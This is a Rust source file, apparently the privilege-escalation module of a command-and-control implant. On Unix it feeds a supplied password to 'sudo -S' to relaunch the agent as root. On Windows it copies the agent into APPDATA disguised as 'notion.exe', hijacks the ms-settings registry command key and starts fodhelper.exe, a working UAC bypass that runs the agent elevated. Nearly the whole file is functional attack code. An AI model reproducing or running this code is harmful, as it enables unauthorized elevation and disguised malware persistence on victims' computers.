use std::error::Error;
use sysinfo::{System, SystemExt, UserExt};
use whoami::username;
use crate::config::ConfigOptions;
use crate::cmd::CommandArgs;
use std::env::args;
use std::process::Command;
#[cfg(windows)] use std::env::{var};
#[cfg(windows)] use std::fs::copy as fs_copy;
#[cfg(windows)] use crate::cmd::getprivs::is_elevated;

/// Determines whether a session can elevate privileges.
/// 
/// On Windows, uses privileges to determine this.
/// 
/// On Linux, uses membership in `sudo`,
/// 
/// Ain't perfect, but it's a start.
pub fn can_elevate() -> bool {
    // Get username and match it against list of users that has data
    // Uses group membership to determine elevation capabilities
    let s = System::new_all();
    let username = username();
    let user = s.users()
        .into_iter()
        .filter(|&u| u.name() == username )
        .nth(0)
        .unwrap();

    #[cfg(target_os = "linux")] {
        return user.groups().contains(&"sudo".to_string());
    }
    #[cfg(target_os = "macos")] {
        return user.groups().contains(&"admin".to_string());
    }
    #[cfg(windows)] {
        user.groups()
            .into_iter()
            .map(|g|g.to_lowercase())
            .any(|g|g.contains("admin"))
    }

}

/// Attempts to elevate privileges. If successful, a new session
/// will be opened as the elevated user.
/// 
/// Usage: `elevate [method] [password]`
/// 
/// Because we can't wait for the output of the child process, 
/// we toss the handle.
pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
    if can_elevate() {
        #[cfg(not(windows))] {
            match cmd_args.nth(0).unwrap().as_str() {
                "sudo" => {
                    let pwd = cmd_args.nth(0).unwrap();
                    // Check for empty pw
                    if pwd.is_empty() {
                        return Ok("Need a sudo password!".to_string());
                    }
                    let encoded_config = config_options.to_base64();
                    let agent_path = args().nth(0).unwrap();
                    let cmd_string = format!("echo '{pwd}' | sudo -S  {agent_path} -b {encoded_config} & disown");
                    Command::new("/bin/bash")
                    .arg("-c")
                    .arg(cmd_string)
                    .spawn()?;
                    Ok("Elevation attempted. Look for the new agent!".to_string())
            }
                _ => Ok("Unknown elevation method".to_string())
            }
        }

        #[cfg(windows)] {
            match cmd_args.nth(0).unwrap().as_str() {
                "fodhelper" => {
                    if let Ok(v) = var("APPDATA") {
                        let mut persist_path: String = v;
                        persist_path.push_str(r"\notion.exe");
                        let exe_path = args().nth(0).unwrap();
                        let encoded_config = config_options.to_base64();
                        // let mut out_file = File::create(path).expect("Failed to create file");
                        match fs_copy(&exe_path, &persist_path) {
                            Ok(_)  => {
                                // Fodhelper routine
                                // With thanks to the Good Mayor himself, Joe Helle
                                // Registry Command Edit
                                //      New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
                                //      New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
                                //      Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value [injection] -Force
                                // Bypass Execution
                                //      Start-Process "C:\Windows\System32\fodhelper.exe"
                                
                                let cmds = vec![
                                    format!(r#"New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force"#),
                                    format!(r#"New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force"#),
                                    format!(r#"Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "{persist_path} -b {encoded_config}" -Force"#),
                                    format!(r#"Start-Process "C:\Windows\System32\fodhelper.exe""#)
                                ];

                                for c in cmds {
                                    Command::new("powershell.exe")
                                    .arg(c)
                                    .spawn()?;
                                    let sleep_time = 
                                    std::time::Duration::from_secs(1);
                                    std::thread::sleep(sleep_time);
                                }
                                Ok("Elevation attempted. Look for the new agent!".to_string())
                            },
                            Err(e) => { return Ok(e.to_string())}
                        }  
                    } else {
                        Ok("Couldn't get APPDATA location".to_string())
                    }

                    

                }
                _ => {
                    Ok("Elevation unavailable".to_string())
                }
            }
        }

    } else {
        Ok("Elevation unavailable".to_string())
    }
}